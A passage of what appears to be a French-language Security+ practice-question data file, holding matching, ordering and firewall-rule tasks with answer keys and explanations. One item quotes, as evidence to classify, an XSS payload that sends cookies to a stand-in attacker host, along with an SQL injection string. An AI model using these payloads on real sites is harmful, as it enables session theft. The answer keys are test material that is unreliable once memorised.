    skills: ["Catégories de contrôles", "Domaine 1.1 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Chaque classification correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-category-001",
        kind: "classification",
        title: "Classer chaque élément dans sa catégorie",
        prompt: "Associez chaque élément à l'une des quatre catégories : Technical, Managerial, Operational, Physical.",
        items: [
          "Firewall rule",
          "Security policy approval",
          "Security guard badge check",
          "Generator",
          "SIEM log forwarding",
          "Door lock",
          "Awareness training",
          "Risk assessment",
        ],
        options: ["Technical", "Managerial", "Operational", "Physical"],
        expectedAnswers: [
          "Technical",
          "Managerial",
          "Operational",
          "Physical",
          "Technical",
          "Physical",
          "Operational",
          "Managerial",
        ],
        explanation: `Technical : contrôles automatisés par un système (firewall rule, SIEM log forwarding).
Managerial : décisions et processus de gouvernance (policy approval, risk assessment).
Operational : actions humaines et procédures (security guard, awareness training).
Physical : équipements matériels et barrières (generator, door lock).`,
        traps: [
          "Technical vs Operational : si c'est automatisé par un système → Technical ; si une personne l'exécute → Operational.",
          "Operational vs Physical : si un humain agit → Operational ; si c'est un objet physique → Physical.",
          "Generator = Physical : équipement matériel assurant la disponibilité, pas un contrôle logiciel.",
          "SIEM log forwarding = Technical : processus automatisé, même s'il soutient les opérations.",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 4. Authentication factors (Messer)
  {
    id: "pbq-messer-authfactor-004",
    domain: "4.6 Facteurs d'authentification",
    type: "scenario_tasks",
    title: "Facteurs d'authentification",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Identity & Access Engineer",
    scenario: "Pour chaque méthode d'authentification décrite, identifiez le facteur correspondant.",
    objective: "Associer une description d'authentification à son facteur : something you know, have, are, ou somewhere you are.",
    source: "Messer",
    skills: ["Facteurs d'authentification", "MFA", "Domaine 4.6 SY0-701"],
    scoring: {
      max: 60,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-authfactor-001",
        kind: "matching",
        title: "Description → Facteur d'authentification",
        prompt: "Associez chaque description au facteur d'authentification correspondant. Les options peuvent être réutilisées.",
        items: [
          "User enters a PIN",
          "User unlocks a door with fingerprint scan",
          "User receives a one-time code on their phone",
          "Login only works from the corporate VPN IP range",
          "User presents a smart card",
          "System authenticates with iris scan",
        ],
        options: [
          "Something you know",
          "Something you have",
          "Something you are",
          "Somewhere you are",
        ],
        expectedAnswers: [
          "Something you know",
          "Something you are",
          "Something you have",
          "Somewhere you are",
          "Something you have",
          "Something you are",
        ],
        explanation: `Something you know : information mémorisée (PIN, mot de passe, phrase secrète).
Something you have : objet physique possédé (smart card, téléphone recevant OTP, token).
Something you are : biométrie (empreinte digitale, scan iris, reconnaissance faciale).
Somewhere you are : géolocalisation ou réseau (VPN IP range, GPS, geofencing).`,
        traps: [
          "PIN + mot de passe = même facteur (something you know) → ce n'est PAS du MFA.",
          "OTP reçu par SMS = something you have (le téléphone), pas something you know.",
          "Biométrie ≠ identifiant/username : c'est toujours something you are.",
          "VPN range = somewhere you are, pas something you have.",
        ],
        points: 60,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 5. Stateful firewall rules — Messer (firewall_rules type)
  {
    id: "pbq-messer-firewall-005",
    domain: "3.2 Architecture réseau — DMZ",
    type: "firewall_rules",
    title: "Firewall Stateful — Scénario Messer",
    difficulty: "intermediate",
    timeLimitSeconds: 420,
    role: "Network Security Engineer",
    scenario: "Configurez les règles d'un firewall stateful protégeant une architecture DMZ/réseau interne selon trois exigences précises. Un firewall stateful n'a pas besoin de règle de retour séparée.",
    objective: "Rédiger des règles firewall stateful exactes (source, destination, protocole, port, action) à partir d'exigences métier.",
    requirements: [
      "Bloquer le trafic HTTP du serveur Web DMZ (172.16.10.10) vers le serveur Database interne (10.10.20.30)",
      "Permettre au serveur Backup interne (10.10.30.40) de transférer des fichiers vers le serveur File DMZ (172.16.10.20) via SFTP",
      "Permettre au serveur Management (10.10.50.25) d'ouvrir un terminal sécurisé sur le serveur Web DMZ (172.16.10.10)",
    ],
    assets: [
      { name: "DMZ Web Server", ip: "172.16.10.10" },
      { name: "DMZ File Server", ip: "172.16.10.20" },
      { name: "Internal Database Server", ip: "10.10.20.30" },
      { name: "Internal Backup Server", ip: "10.10.30.40" },
      { name: "Management Server", ip: "10.10.50.25" },
    ],
    ports: [
      { port: 22, protocol: "TCP", service: "SSH / SFTP" },
      { port: 80, protocol: "TCP", service: "HTTP" },
      { port: 443, protocol: "TCP", service: "HTTPS" },
    ],
    expectedRules: [
      { source: "172.16.10.10", destination: "10.10.20.30", protocol: "TCP", port: 80, action: "Deny" },
      { source: "10.10.30.40", destination: "172.16.10.20", protocol: "TCP", port: 22, action: "Allow" },
      { source: "10.10.50.25", destination: "172.16.10.10", protocol: "TCP", port: 22, action: "Allow" },
    ],
    pieges: [
      "SFTP = SSH/TCP 22, pas TCP 443 ni TCP 21.",
      "Terminal sécurisé = SSH (TCP 22), pas Telnet (TCP 23).",
      "Firewall stateful : pas besoin d'ajouter une règle de retour pour le trafic de réponse.",
      "HTTP = TCP 80 (pas UDP 80).",
      "La source est toujours l'émetteur initial du flux — ne pas inverser src/dst.",
    ],
    scoring: {
      max: 90,
      rules: [
        { condition: "Règle Block HTTP DMZ Web→DB correcte (src, dst, proto, port, action)", points: 30 },
        { condition: "Règle Allow SFTP Backup→File correcte", points: 30 },
        { condition: "Règle Allow SSH Management→Web correcte", points: 30 },
      ],
      penalties: [
        { condition: "Règle de retour inutile ajoutée", points: -10 },
        { condition: "Source et destination inversées", points: -15 },
      ],
    },
  } satisfies FirewallPBQ,

  // 6. PKI / Certificates matching (Messer B)
  {
    id: "pbq-messer-pki-006",
    domain: "1.4 Cryptographie — PKI",
    type: "scenario_tasks",
    title: "PKI : associer éléments et fonctions",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Security Engineer",
    scenario: "L'équipe déploie une PKI interne. Associez chaque composant PKI à sa fonction.",
    objective: "Connaître les rôles de CRL, OCSP, CA, CSR et RA dans une infrastructure à clés publiques.",
    source: "Messer B",
    skills: ["PKI", "Révocation de certificats", "Domaine 1.4 SY0-701"],
    scoring: {
      max: 50,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-pki-001",
        kind: "matching",
        title: "Composant PKI → Fonction",
        prompt: "Associez chaque composant PKI à la description correcte de sa fonction.",
        items: ["CRL", "OCSP", "CA", "CSR", "RA"],
        options: [
          "List of revoked certificates",
          "Real-time certificate status check",
          "Issues and manages certificates",
          "Request sent to have a public key signed",
          "Verifies identity before certificate issuance",
        ],
        expectedAnswers: [
          "List of revoked certificates",
          "Real-time certificate status check",
          "Issues and manages certificates",
          "Request sent to have a public key signed",
          "Verifies identity before certificate issuance",
        ],
        explanation: `CRL (Certificate Revocation List) : liste périodiquement publiée des certificats révoqués.
OCSP (Online Certificate Status Protocol) : vérification en temps réel du statut d'un certificat.
CA (Certificate Authority) : autorité qui signe, émet et gère les certificats.
CSR (Certificate Signing Request) : demande envoyée à la CA contenant la clé publique à signer.
RA (Registration Authority) : vérifie l'identité du demandeur avant transmission à la CA.`,
        traps: [
          "CRL vs OCSP : CRL = liste téléchargée périodiquement ; OCSP = interrogation en ligne à la demande.",
          "CSR ≠ certificat final : le CSR est la demande, pas le certificat signé.",
          "CA vs RA : CA signe/émet ; RA vérifie l'identité (délégation de validation).",
          "Le CSR contient la clé PUBLIQUE, jamais la clé privée.",
        ],
        points: 50,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 7. Desktop vs Tablet/Mobile security (Messer B)
  {
    id: "pbq-messer-endpoint-007",
    domain: "4.1 Sécurité des endpoints",
    type: "scenario_tasks",
    title: "Sécurité endpoint : Desktop vs Tablette",
    difficulty: "intermediate",
    timeLimitSeconds: 360,
    role: "Endpoint Security Analyst",
    scenario: "Une entreprise déploie une application sensible sur des desktops (navigateur) et des tablettes terrain. Sélectionnez les meilleures fonctionnalités de sécurité pour chaque plateforme.",
    objective: "Distinguer les contrôles de sécurité adaptés aux postes fixes de ceux adaptés aux appareils mobiles.",
    source: "Messer B",
    skills: ["Sécurité mobile", "MDM", "Sécurité endpoint", "Domaine 4.1 SY0-701"],
    scoring: {
      max: 100,
      rules: [{ condition: "Chaque case correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-endpoint-001",
        kind: "matrix",
        title: "Sélectionner les contrôles par plateforme",
        prompt: "Pour chaque fonctionnalité, cochez la ou les plateformes pour lesquelles elle est le MEILLEUR choix. Certaines fonctionnalités ne s'appliquent à aucune plateforme.",
        items: [
          "Anti-malware",
          "Host-based firewall",
          "MDM integration",
          "Full device encryption",
          "Biometric authentication",
          "OSINT",
          "Infrared sensor",
        ],
        options: ["Desktop", "Tablet"],
        expectedAnswers: [
          "Anti-malware: Desktop",
          "Host-based firewall: Desktop",
          "MDM integration: Tablet",
          "Full device encryption: Tablet",
          "Biometric authentication: Tablet",
        ],
        explanation: `Desktop : anti-malware et host-based firewall sont les contrôles fondamentaux d'un poste fixe sous Windows/macOS.
Tablette terrain : MDM pour gérer les politiques à distance, full device encryption contre la perte/vol, biometric auth pour l'accès sans clavier.
OSINT : source de renseignement externe, pas un contrôle d'endpoint.
Infrared sensor : capteur physique de présence, pas une fonctionnalité de sécurité applicative mobile.`,
        traps: [
          "OSINT n'est pas un contrôle de sécurité endpoint : c'est une technique de collecte de renseignement.",
          "Infrared sensor = capteur physique, pas un contrôle de sécurité mobile.",
          "Oublier le chiffrement complet sur tablette = faute grave (risque perte/vol en mobilité).",
          "MDM sur desktop classique est possible mais le 'BEST' pour tablette mobile reste MDM.",
        ],
        points: 100,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 8. Incident Response ordering (Messer B)
  {
    id: "pbq-messer-ir-008",
    domain: "4.8 Réponse aux incidents",
    type: "scenario_tasks",
    title: "Ordonner les phases de réponse aux incidents",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Incident Responder",
    scenario: "Un incident de sécurité vient d'être détecté. Remettez les phases du processus de réponse aux incidents dans le bon ordre.",
    objective: "Connaître l'ordre logique des phases IR selon le cadre NIST/CompTIA.",
    source: "Messer B",
    skills: ["Incident Response", "Phases IR", "Domaine 4.8 SY0-701"],
    scoring: {
      max: 70,
      rules: [{ condition: "Chaque phase en position correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-ir-001",
        kind: "ordering",
        title: "Remettre les phases IR dans l'ordre",
        prompt: "Utilisez les flèches ↑↓ pour placer les phases dans le bon ordre chronologique.",
        items: [
          "Preparation",
          "Detection",
          "Analysis",
          "Containment",
          "Eradication",
          "Recovery",
          "Lessons Learned",
        ],
        expectedAnswers: [
          "Preparation",
          "Detection",
          "Analysis",
          "Containment",
          "Eradication",
          "Recovery",
          "Lessons Learned",
        ],
        explanation: `1. Preparation : playbooks, outils forensiques, formation de l'équipe — avant l'incident.
2. Detection : alerte SIEM ou signalement indiquant qu'un incident est possible.
3. Analysis : valider l'alerte, déterminer la portée, identifier les hôtes affectés.
4. Containment : isoler les systèmes infectés pour limiter la propagation.
5. Eradication : supprimer le malware, les backdoors et les mécanismes de persistance.
6. Recovery : restaurer depuis une sauvegarde propre et remettre en production.
7. Lessons Learned : réunion post-incident, mise à jour des procédures.`,
        traps: [
          "Recovery avant Eradication = risque de restaurer dans un environnement encore compromis.",
          "Lessons Learned doit venir après la résolution complète, pas pendant.",
          "Detection ≠ Analysis : Detection = alerte reçue ; Analysis = validation et détermination de la portée.",
          "Containment ≠ Eradication : Containment limite la propagation ; Eradication supprime la cause.",
        ],
        points: 70,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 9. Network/security devices matching (Messer C)
  {
    id: "pbq-messer-devices-009",
    domain: "3.1 Dispositifs et équipements de sécurité réseau",
    type: "scenario_tasks",
    title: "Associer dispositifs réseau et fonctions",
    difficulty: "intermediate",
    timeLimitSeconds: 360,
    role: "Network Security Analyst",
    scenario: "Votre équipe documente l'architecture réseau. Associez chaque description fonctionnelle au dispositif réseau correspondant.",
    objective: "Connaître le rôle de chaque appliance et outil de sécurité réseau.",
    source: "Messer C",
    skills: ["Appliances réseau", "Sécurité périmétrique", "Domaine 3.1 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-devices-001",
        kind: "matching",
        title: "Description fonctionnelle → Dispositif réseau",
        prompt: "Associez chaque description à l'appliance ou l'outil réseau le plus approprié.",
        items: [
          "Blocks SQL injection against a public web application",
          "Intercepts browser requests and caches responses for clients",
          "Routes traffic between VLANs at Layer 3",
          "Distributes traffic across redundant web servers",
          "Provides secure administrative access to internal servers via a bastion",
          "Manages mobile device policies and enforces compliance",
          "Passively collects and analyzes network traffic",
          "Blocks malicious traffic inline on the network path",
        ],
        options: [
          "WAF",
          "Proxy server",
          "Router",
          "Load balancer",
          "Jump server",
          "MDM",
          "Sensor",
          "IPS",
        ],
        expectedAnswers: [
          "WAF",
          "Proxy server",
          "Router",
          "Load balancer",
          "Jump server",
          "MDM",
          "Sensor",
          "IPS",
        ],
        explanation: `WAF (Web Application Firewall) : protection couche 7 contre les injections SQL, XSS, etc.
Proxy server : intermédiaire client/serveur, cache les réponses et masque les IP clients.
Router : interconnecte des réseaux et route le trafic entre VLANs (couche 3).
Load balancer : répartit les requêtes entre plusieurs serveurs pour la haute disponibilité.
Jump server (bastion) : point d'accès sécurisé unique pour administrer les serveurs internes.
MDM (Mobile Device Management) : gestion centralisée des politiques sur appareils mobiles.
Sensor (IDS passif) : observe et collecte le trafic sans interférer.
IPS : détecte ET bloque les menaces inline sur le chemin réseau.`,
        traps: [
          "WAF vs Firewall réseau : WAF = couche application web ; firewall réseau = couches 3/4.",
          "Proxy vs Reverse proxy : proxy protège les clients ; reverse proxy protège les serveurs.",
          "Router vs Switch : router sépare les réseaux/VLANs (L3) ; switch connecte en L2.",
          "IPS vs Sensor/IDS : IPS bloque activement ; sensor/IDS observe passivement.",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 10. Attack characteristics matching (Messer C)
  {
    id: "pbq-messer-attacks2-010",
    domain: "2.4 Caractéristiques d'attaques",
    type: "scenario_tasks",
    title: "Reconnaître les attaques par leurs symptômes",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Security Analyst",
    scenario: "Vous examinez des rapports d'incidents. Pour chaque symptôme observé, identifiez le type d'attaque.",
    objective: "Reconnaître une attaque à partir de sa caractéristique observable.",
    source: "Messer C",
    skills: ["Indicateurs d'attaque", "Domaine 2.4 SY0-701"],
    scoring: {
      max: 60,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-attacks2-001",
        kind: "matching",
        title: "Symptôme → Type d'attaque",
        prompt: "Associez chaque symptôme au type d'attaque correspondant.",
        items: [
          "Website stops responding to normal users due to a traffic flood from multiple sources",
          "A captured session token is retransmitted to a server",
          "Malware hides itself deep in the operating system",
          "An email link leads users to a fake login page requesting credentials",
          "Many different passwords are tried against one known username",
          "Extra code is added as application input to extract database records",
        ],
        options: ["DDoS", "Replay", "Rootkit", "Phishing", "Brute force", "Injection"],
        expectedAnswers: ["DDoS", "Replay", "Rootkit", "Phishing", "Brute force", "Injection"],
        explanation: `DDoS : trafic massif depuis de multiples sources saturant un service jusqu'à l'indisponibilité.
Replay : session ou token capturé et retransmis tel quel pour usurper une authentification.
Rootkit : malware qui se cache dans le noyau ou l'OS pour persister sans être détecté.
Phishing : lien frauduleux dans un email menant à une fausse page de connexion.
Brute force : tentatives exhaustives de mots de passe sur un compte avec un identifiant connu.
Injection : insertion de code malveillant dans un champ d'entrée applicatif pour exfiltrer des données.`,
        traps: [
          "Brute force vs Password spraying : brute force = many passwords on one account ; spraying = one password across many accounts.",
          "Replay vs On-path : replay réutilise une capture ; on-path intercepte en temps réel.",
          "Injection vs Phishing : injection cible l'application ; phishing cible l'humain.",
          "DDoS vs ressource exhaustion : DDoS provient de trafic massif/multiple, pas d'un bug interne.",
        ],
        points: 60,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 11. Cryptography matching (Messer C)
  {
    id: "pbq-messer-crypto-011",
    domain: "1.4 Concepts de cryptographie",
    type: "scenario_tasks",
    title: "Concepts cryptographiques : associer description et terme",
    difficulty: "intermediate",
    timeLimitSeconds: 300,
    role: "Cryptography Analyst",
    scenario: "Votre équipe révise les contrôles cryptographiques. Associez chaque description à son concept.",
    objective: "Distinguer les concepts crypto souvent confondus : salting, steganography, masking, asymmetric, collision, key stretching.",
    source: "Messer C",
    skills: ["Cryptographie", "Hachage", "Domaine 1.4 SY0-701"],
    scoring: {
      max: 60,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-crypto-001",
        kind: "matching",
        title: "Description → Concept cryptographique",
        prompt: "Associez chaque description au concept cryptographique correspondant.",
        items: [
          "Random data is added to a password before hashing to make each hash unique",
          "Data is hidden inside another media file (image, audio, video)",
          "Sensitive data is replaced or obscured in an application interface",
          "Different keys are used for encryption and decryption",
          "Two different inputs produce the same hash output",
          "Multiple rounds of hashing are applied to make cracking computationally slower",
        ],
        options: [
          "Salting",
          "Steganography",
          "Masking",
          "Asymmetric",
          "Collision",
          "Key stretching",
        ],
        expectedAnswers: [
          "Salting",
          "Steganography",
          "Masking",
          "Asymmetric",
          "Collision",
          "Key stretching",
        ],
        explanation: `Salting : valeur aléatoire ajoutée avant le hachage pour rendre chaque hash unique même avec le même mot de passe.
Steganography : dissimulation de données dans un autre fichier média sans modifier l'apparence visible.
Masking : remplacement ou obscurcissement de données sensibles dans l'interface (ex. **** pour un numéro de carte).
Asymmetric : chiffrement utilisant une paire de clés publique/privée (ex. RSA, ECC).
Collision : deux entrées différentes produisant le même condensat hash — faiblesses dans MD5/SHA-1.
Key stretching (PBKDF2, bcrypt, scrypt) : ralentit le craquage en multipliant les itérations de hachage.`,
        traps: [
          "Salting vs Key stretching : salt = unicité du hash ; key stretching = ralentissement du craquage (complémentaires).",
          "Masking vs Encryption : masking cache l'affichage ; encryption protège les données de bout en bout.",
          "Steganography vs Encryption : steganography cache l'existence du message ; encryption en cache le contenu.",
          "Collision ≠ hash mismatch : collision = deux entrées différentes → même hash ; mismatch = hash corrompu.",
        ],
        points: 60,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 12. Best security technology for scenario (Messer C)
  {
    id: "pbq-messer-techscenario-012",
    domain: "3.2 Meilleures technologies de sécurité par scénario",
    type: "scenario_tasks",
    title: "Choisir la meilleure technologie pour chaque scénario",
    difficulty: "intermediate",
    timeLimitSeconds: 300,
    role: "Security Architect",
    scenario: "L'architecte réseau doit recommander la technologie de sécurité la plus adaptée à chaque besoin opérationnel.",
    objective: "Sélectionner la technologie réseau/sécurité la plus applicable selon le contexte.",
    source: "Messer C",
    skills: ["VPN", "NGFW", "SD-WAN", "802.1X", "Sandboxing", "Domaine 3.2 SY0-701"],
    scoring: {
      max: 50,
      rules: [{ condition: "Chaque choix correct", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-techscenario-001",
        kind: "matching",
        title: "Scénario → Meilleure technologie de sécurité",
        prompt: "Associez chaque scénario à la technologie de sécurité la plus appropriée.",
        items: [
          "Field engineer uses laptop in hotels and coffee shops on public Wi-Fi",
          "Developers test potentially malicious applications before deploying to production",
          "Admin needs to block access to known malicious websites",
          "Corporate branch sites need direct, optimized access to cloud services",
          "Users must authenticate with corporate credentials before joining the wired or wireless network",
        ],
        options: ["VPN", "Sandboxing", "NGFW", "SD-WAN", "802.1X"],
        expectedAnswers: ["VPN", "Sandboxing", "NGFW", "SD-WAN", "802.1X"],
        explanation: `VPN : chiffre le trafic sur un réseau non fiable (Wi-Fi public) en créant un tunnel sécurisé.
Sandboxing : environnement isolé pour exécuter du code non fiable sans risque pour la production.
NGFW (Next-Gen Firewall) : inspection applicative avec filtrage URL/réputation pour bloquer les sites malveillants.
SD-WAN : optimise la connectivité WAN multi-sites vers le cloud (QoS, failover, accès direct).
802.1X : standard d'authentification NAC (Network Access Control) pour les accès filaires et Wi-Fi.`,
        traps: [
          "VPN ne filtre pas les URL malveillantes : il chiffre le trafic, mais ne bloque pas les sites.",
          "Sandboxing ≠ VPN : sandbox = exécution isolée, pas tunnel réseau.",
          "NGFW pour authentifier un port réseau : 802.1X est conçu pour ça (port-based NAC).",
          "SD-WAN ≠ analyse malware : SD-WAN optimise le WAN, il ne filtre pas les menaces applicatives.",
        ],
        points: 50,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // ─── PBQ2 Series ─────────────────────────────────────────────────────────

  // PBQ2-1. Stateful firewall — 4 rules including Telnet block
  {
    id: "pbq2-fw-001",
    domain: "4.5 Protocoles et communications sécurisées",
    type: "firewall_rules",
    title: "Firewall Stateful — 4 règles (HTTP, SFTP, SSH, Telnet)",
    difficulty: "intermediate",
    timeLimitSeconds: 300,
    role: "Security Administrator",
    scenario: "Vous êtes l'administrateur sécurité d'une entreprise avec une DMZ et un réseau interne. Le firewall est stateful. Configurez les règles pour répondre aux exigences.",
    objective: "Configurer un firewall stateful avec règles source/destination/protocole/port/action précises.",
    requirements: [
      "Bloquer toutes les sessions HTTP du serveur Web DMZ (172.16.10.10) vers le serveur Database interne (10.10.20.30)",
      "Permettre au serveur Backup interne (10.10.30.40) d'envoyer des sauvegardes chiffrées vers le serveur File DMZ (172.16.10.20) via SFTP",
      "Permettre au poste Management (10.10.50.25) d'administrer le serveur Web DMZ (172.16.10.10) via terminal sécurisé",
      "Bloquer tout le trafic Telnet de n'importe quelle source vers n'importe quelle destination",
      "Ne pas créer de règles de retour inutiles (firewall stateful)",
    ],
    assets: [
      { name: "Web Server", ip: "172.16.10.10" },
      { name: "File Server", ip: "172.16.10.20" },
      { name: "Database Server", ip: "10.10.20.30" },
      { name: "Backup Server", ip: "10.10.30.40" },
      { name: "Management Workstation", ip: "10.10.50.25" },
      { name: "Internet", ip: "ANY" },
    ],
    ports: [
      { port: 22, protocol: "TCP", service: "SSH / SFTP" },
      { port: 23, protocol: "TCP", service: "Telnet" },
      { port: 80, protocol: "TCP", service: "HTTP" },
      { port: 443, protocol: "TCP", service: "HTTPS" },
      { port: 3389, protocol: "TCP", service: "RDP" },
      { port: 53, protocol: "TCP/UDP", service: "DNS" },
    ],
    expectedRules: [
      { source: "172.16.10.10", destination: "10.10.20.30", protocol: "TCP", port: 80, action: "Deny" },
      { source: "10.10.30.40", destination: "172.16.10.20", protocol: "TCP", port: 22, action: "Allow" },
      { source: "10.10.50.25", destination: "172.16.10.10", protocol: "TCP", port: 22, action: "Allow" },
      { source: "ANY", destination: "ANY", protocol: "TCP", port: 23, action: "Deny" },
    ],
    pieges: [
      "TCP/443 pour SFTP : faux — SFTP utilise SSH/TCP 22.",
      "TCP/23 pour terminal sécurisé : faux — Telnet n'est pas sécurisé, SSH = TCP 22.",
      "Ajouter une règle retour (ex. DB → Web TCP 80 Allow) : inutile sur stateful firewall.",
      "Bloquer HTTP uniquement depuis Internet : la consigne demande Web Server → Database Server.",
      "Allow ANY → DB TCP 3306 : expose la base de données inutilement.",
    ],
    scoring: {
      max: 100,
      rules: [
        { condition: "HTTP Web→DB bloqué correctement", points: 20 },
        { condition: "SFTP Backup→File autorisé TCP/22", points: 20 },
        { condition: "SSH Management→Web autorisé TCP/22", points: 20 },
        { condition: "Telnet ANY→ANY bloqué TCP/23", points: 20 },
        { condition: "Aucune règle retour inutile + sens correct src/dst", points: 20 },
      ],
      penalties: [
        { condition: "Règle retour inutile ajoutée", points: -10 },
        { condition: "Source/destination inversées", points: -15 },
        { condition: "Mauvais port (ex. 443 pour SFTP)", points: -10 },
      ],
    },
  } satisfies FirewallPBQ,

  // PBQ2-2. Match Attack Type to Evidence and Mitigation
  {
    id: "pbq2-attackmit-002",
    domain: "2.4 Indicateurs d'activité malveillante · 2.5 Techniques de mitigation",
    type: "scenario_tasks",
    title: "Associer preuve → type d'attaque et mitigation",
    difficulty: "intermediate",
    timeLimitSeconds: 420,
    role: "SOC Analyst",
    scenario: "Vous êtes analyste SOC et examinez plusieurs alertes. Pour chaque preuve, identifiez le type d'attaque le plus précis ET la meilleure mitigation. Toutes les options ne seront pas utilisées.",
    objective: "Reconnaître le type d'attaque depuis une preuve technique et choisir la mitigation appropriée.",
    source: "PBQ2",
    skills: ["Analyse d'alertes SOC", "Mitigation des menaces", "Domaines 2.4 et 2.5 SY0-701"],
    scoring: {
      max: 80,
      rules: [
        { condition: "Chaque attack type correct", points: 8 },
        { condition: "Chaque mitigation correcte", points: 8 },
      ],
      penalties: [],
    },
    tasks: [
      {
        id: "t-atk-001",
        kind: "matching",
        title: "Preuve → Type d'attaque",
        prompt: "Associez chaque preuve au type d'attaque le plus précis. Toutes les options ne seront pas utilisées.",
        items: [
          'E1: GET /search?q=<script>document.location=\'http://evil.example/cookie?c=\'+document.cookie</script>',
          "E2: GET /item?id=105 OR 1=1 --",
          "E3: Un utilisateur reçoit un SMS lui demandant de vérifier son compte paie.",
          "E4: Les logs DNS montrent des milliers de requêtes TXT vers des sous-domaines aléatoires de exfil.example.net.",
          "E5: Dec 30 08:40:03 web01 Failed password for root from 203.0.113.77 ssh2 repeated 900 times.",
        ],
        options: [
          "Cross-site scripting",
          "SQL injection",
          "Smishing",
          "DNS tunneling",
          "Brute force",
          "DDoS",
          "RFID cloning",
          "On-path attack",
        ],
        expectedAnswers: [
          "Cross-site scripting",
          "SQL injection",
          "Smishing",
          "DNS tunneling",
          "Brute force",
        ],
        explanation: `E1 — <script> dans un paramètre URL = Cross-site scripting (XSS) : vol de cookies via injection JavaScript.
E2 — OR 1=1 -- dans une requête = SQL injection : altération de la logique SQL.
E3 — SMS malveillant = Smishing (SMS + phishing).
E4 — Milliers de requêtes TXT vers sous-domaines aléatoires = DNS tunneling / exfiltration de données.
E5 — 900 échecs SSH sur root depuis la même IP = Brute force (pas spraying car un seul compte).`,
        traps: [
          "XSS vs SQLi : XSS contient <script> ; SQLi contient OR 1=1 ou des guillemets SQL.",
          "Smishing vs Phishing : SMS = smishing ; email = phishing.",
          "DNS tunneling vs DGA : tunneling transporte des données ; DGA génère des domaines pour C2.",
          "Brute force vs Password spraying : ici un seul compte ciblé avec beaucoup d'essais = brute force.",
        ],
        points: 40,
      },
      {
        id: "t-atk-002",
        kind: "matching",
        title: "Preuve → Meilleure mitigation",
        prompt: "Associez chaque preuve à la meilleure mitigation. Toutes les options ne seront pas utilisées.",
        items: [
          'E1: GET /search?q=<script>document.location=\'http://evil.example/cookie?c=\'+document.cookie</script>',
          "E2: GET /item?id=105 OR 1=1 --",
          "E3: Un utilisateur reçoit un SMS lui demandant de vérifier son compte paie.",
          "E4: Les logs DNS montrent des milliers de requêtes TXT vers des sous-domaines aléatoires de exfil.example.net.",
          "E5: Dec 30 08:40:03 web01 Failed password for root from 203.0.113.77 ssh2 repeated 900 times.",
        ],
        options: [
          "Output encoding and input validation",
          "Parameterized queries",
          "Security awareness training and SMS filtering",
          "DNS filtering and DLP monitoring",
          "Account lockout and disable root SSH login",
          "Increase RAID redundancy",
          "Certificate pinning",
          "Disable DHCP",
        ],
        expectedAnswers: [
          "Output encoding and input validation",
          "Parameterized queries",
          "Security awareness training and SMS filtering",
          "DNS filtering and DLP monitoring",
          "Account lockout and disable root SSH login",
        ],
        explanation: `XSS → Output encoding et input validation : neutraliser les scripts avant rendu.
SQLi → Parameterized queries (prepared statements) : séparer code SQL et données.
Smishing → Security awareness + SMS filtering : former les utilisateurs et filtrer les SMS suspects.
DNS tunneling → DNS filtering + DLP monitoring : bloquer les requêtes DNS anormales et surveiller l'exfiltration.
Brute force SSH → Account lockout + disable root SSH login : limiter les tentatives et interdire root en SSH.`,
        traps: [
          "RAID = haute disponibilité, pas une mitigation contre les attaques.",
          "Certificate pinning = contre on-path/MITM, pas contre XSS.",
          "Disable DHCP = hors sujet pour ces attaques.",
        ],
        points: 40,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // PBQ2-3. Security Controls Placement
  {
    id: "pbq2-controls-003",
    domain: "1.1 Contrôles de sécurité · 1.2 Sécurité physique",
    type: "scenario_tasks",
    title: "Meilleur contrôle de sécurité par emplacement (avec Honeyfile et SIEM)",
    difficulty: "foundation",
    timeLimitSeconds: 360,
    role: "Security Consultant",
    scenario: "Une entreprise manufacturière améliore sa sécurité physique et logique. Sélectionnez le meilleur contrôle pour chaque emplacement ou exigence. Chaque contrôle est utilisé une seule fois.",
    objective: "Associer le contrôle de sécurité optimal à chaque emplacement ou besoin opérationnel.",
    source: "PBQ2",
    skills: ["Contrôles physiques", "Honeyfile/Honeypot", "SIEM", "Domaine 1.1 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Chaque contrôle correct", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-ctrl-001",
        kind: "matching",
        title: "Emplacement / Exigence → Meilleur contrôle",
        prompt: "Associez chaque emplacement ou exigence au meilleur contrôle de sécurité. Chaque contrôle est utilisé une seule fois.",
        items: [
          "R1. Parking et zone de livraison — décourager l'accès non autorisé la nuit",
          "R2. Périmètre extérieur — définir et protéger la limite physique",
          "R3. Zone de réception — vérifier l'identité des visiteurs",
          "R4. Entrée du data center — empêcher le tailgating",
          "R5. Porte de la salle serveurs — accès par carte employé",
          "R6. Console du data center — vérifier une caractéristique humaine unique",
          "R7. Dossiers de projet sensibles — alerter en cas d'accès non autorisé via un fichier leurre",
